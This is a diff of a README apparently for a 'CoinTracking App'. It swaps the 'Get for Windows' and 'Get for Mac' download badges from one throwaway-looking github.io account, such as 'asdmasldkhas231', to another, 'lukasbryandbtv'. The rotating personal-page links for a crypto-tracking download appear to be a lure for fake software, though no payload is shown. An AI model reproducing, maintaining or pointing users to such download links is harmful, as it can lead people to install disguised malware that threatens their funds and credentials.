@@ -6,9 +6,9 @@
 <br>
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://cointracking-app.github.io/.github)  
+[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://lukasbryandbtv.github.io/.github/CoinTracking-App)  
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://asdmasldkhas231.github.io/.github)
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://lukasbryandbtv.github.io/.github/CoinTracking-App)
 </div>
 
 ---
